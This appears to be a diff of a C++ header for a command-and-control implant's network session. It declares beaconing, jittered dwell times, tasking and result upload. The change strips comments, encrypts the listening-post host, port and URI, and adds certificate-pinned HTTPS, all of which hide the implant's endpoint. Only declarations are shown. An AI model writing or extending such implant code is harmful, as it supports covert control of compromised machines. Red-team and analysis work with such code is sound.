@@ -15,13 +15,10 @@
 #include <boost/property_tree/ptree.hpp>
 
 struct NetSession {
-    //NetSession constructor
     NetSession(std::string host, std::string port, std::string uri);
 
-    //thread for servicing tasks
     std::future<void> taskThread;
 
-    //public functions exposed by implant
     void beacon();
     void setMeanDwell(double meanDwell);
     void setRunning(bool isRunning);
@@ -29,32 +26,28 @@ struct NetSession {
     void start();
 
 private:
-    //listening post endpoint config
-    const std::string host, port, uri;
+    std::string hostEncrypted;
+    std::string portEncrypted;
+    std::string uriEncrypted;
 
-    //variables for implant config, dwell time, running status
-    //exponential distribution to get a variable number of seconds for dwell time (communication pattern is not constant!!)
     std::exponential_distribution<double> dwellDistributionSeconds;
     std::atomic_bool isRunning;
 
-    //mutexes
     std::mutex taskMutex, resultsMutex;
 
-    //storing results
     boost::property_tree::ptree results;
-
-    //storing tasks
     std::vector<Task> tasks;
 
-    //generate random device
     std::random_device device;
 
     void parseTasks(const std::string& response);
-    //using nodiscard throughout because we neber expect to make a call to sendResults and discard the return value
-    [[nodiscard]] std::string sendResults();
+    [[nodiscard]] std::string sendResults(const std::string& certPem);
+
+    std::string decryptConfig(const std::string& encrypted) const;
 };
 
 [[nodiscard]] std::string sendHttpRequest(std::string_view host,
     std::string_view port, 
     std::string_view uri, 
-    std::string_view payload);
+    std::string_view payload,
+    const std::string& certPem);
